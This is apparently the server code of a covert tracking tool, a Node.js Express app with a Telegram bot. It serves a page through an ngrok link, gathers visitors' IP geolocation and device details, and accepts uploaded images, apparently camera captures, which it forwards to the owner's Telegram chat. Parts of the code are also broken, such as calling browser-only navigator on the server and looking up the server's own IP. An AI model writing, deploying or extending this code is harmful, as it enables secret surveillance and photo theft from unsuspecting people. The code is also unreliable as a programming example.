const https = require('https');
require("./assets/require");

const bot = new Telegraf(TOKEN_TELEGRAM);
const app = express();

app.use(express.static(path.join(__dirname, 'tsc')));
app.use(express.json({ limit: '10mb' }));

 
function getDeviceType() {
  const userAgent = navigator.userAgent;

  if (/mobile/i.test(userAgent)) {
    return 'Mobile';
  } else if (/tablet/i.test(userAgent)) {
    return 'Tablet';
  } else if (/iPad|Android|Touch/i.test(userAgent)) {
    return 'Tablet';
  } else {
    return 'Desktop';
  }
}


app.get('/', async (req, res) => {
  let location = 'Tidak diketahui';

  try {
    fetch(`https://api.ipify.org?format=json`)
      .then(response => response.json())
      .then(locationData => {
        const userIP = locationData.ip;
        console.log(`IP yang diambil: ${userIP}`);

        let location = 'Tidak diketahui';

        fetch(`https://api.ipapi.is?q=${userIP}`)
          .then(res => res.json())
          .then(res => {
            
            const Device = getDeviceType() || "Tidak diketahui";
            const userAgent = req.headers['user-agent'] || "Tidak diketahui";

            const city = res.location.city || 'Tidak diketahui';
            const country = res.location.country || 'Tidak diketahui';
            const countryCode = res.location.country_code || 'Tidak diketahui';
            const timezone = res.location.timezone || 'Tidak diketahui';
            const latitude = res.location.latitude || 'Tidak diketahui';
            const longitude = res.location.longitude || 'Tidak diketahui';

            const companyName = res.company ? res.company.name : 'Tidak diketahui';
            const companyDomain = res.company ? res.company.domain : 'Tidak diketahui';
            const companyType = res.company ? res.company.type : 'Tidak diketahui';
            const asnOrg = res.asn ? res.asn.org : 'Tidak diketahui';
            const asnDescription = res.asn ? res.asn.descr : 'Tidak diketahui';
            const asnRoute = res.asn ? res.asn.route : 'Tidak diketahui';
            const abuseName = res.abuse ? res.abuse.name : 'Tidak diketahui';
            const abuseEmail = res.abuse ? res.abuse.email : 'Tidak diketahui';

const message = `
======= CATOZOLALA =========

  📱 Device: ${Device}
   - User Agent: ${userAgent}

  🆔 IP yang mengakses: ${userIP}
  🌍 Lokasi: ${city}, ${country} (${countryCode})
  🕒 Timezone: ${timezone}
  🌐 Latitude: ${latitude}
  🌐 Longitude: ${longitude}
  
  🏢 Company:
    - Nama: ${companyName}
    - Domain: ${companyDomain}
    - Tipe: ${companyType}
  
  🔒 ASN Information:
    - Organisasi ASN: ${asnOrg}
    - Deskripsi ASN: ${asnDescription}
    - Rute ASN: ${asnRoute}

  ⚠️ Abuse Contact:
    - Nama: ${abuseName}
    - Email: ${abuseEmail}
`;
            
            bot.telegram.sendMessage(OWNER_TELEGRAM, message);
          })
          .catch(err => {
            console.error('Gagal mendapatkan lokasi:', err);
          });
      })
      .catch(err => {
        console.error('Gagal mendapatkan IP:', err);
      });
  } catch (err) {
    console.error('Gagal dalam proses pengambilan data:', err);
  }
  
  res.sendFile(path.join(__dirname, 'tsc', 'akses.html'));
});


app.post('/upload-photo', (req, res) => {
  const { image } = req.body;
  const userAgent = req.headers['user-agent'] || "Tidak diketahui";
  const deviceType = getDeviceType(userAgent) || "Tidak diketahui";

  if (!image) {
    console.log('Tidak ada gambar yang dikirim.');
    return;
  }

  const base64Data = image.replace(/^data:image\/png;base64,/, '');
  const uploadDir = path.join(__dirname, 'uploads');

  if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
  }

  const timestamp = moment().format('YYYY-MM-DD_HH-mm-ss');
  const filePath = path.join(uploadDir, `${timestamp}.png`);

  // Mengambil IP menggunakan api.ipify.org
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(locationData => {
      const userIP = locationData.ip || 'Tidak diketahui';
      
      // Menyimpan file gambar
      fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (err) {
          console.error('Gagal menyimpan gambar:', err);
          return;
        }

        // Membuat pesan dengan IP dan device
        const message = `
        ======= CATOZOLALA =========

        📱 Device: ${deviceType}
        - User Agent: ${userAgent}

        🆔 IP yang mengakses: ${userIP}
        `;

        // Mengirim gambar beserta deskripsi ke Telegram
        bot.telegram.sendPhoto(OWNER_TELEGRAM, { source: filePath }, { caption: message })
          .then(() => {
            console.log('Gambar berhasil dikirim ke Telegram.');
          })
          .catch(err => {
            console.error('Gagal mengirim gambar ke Telegram:', err);
          });
      });
    })
    .catch(err => {
      console.error('Gagal mendapatkan IP dari api.ipify.org:', err);
      res.status(500).send('Terjadi kesalahan saat mengambil IP.');
    });
});

app.listen(process.env.PORT || 3000, () => {
  bot.telegram.sendMessage(OWNER_TELEGRAM, "🚀 Sukses Menjalankan bot Telegram.... \nServer berjalan di https://abcd1234.ngrok.io", {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Salin Link",
            url: "https://abcd1234.ngrok.io"
          }
        ]
      ]
    }
  }).catch(error => {
    console.error('Error sending message:', error);
  });

  console.log('Server berjalan pada port http://localhost:' + (process.env.PORT || 3000));
});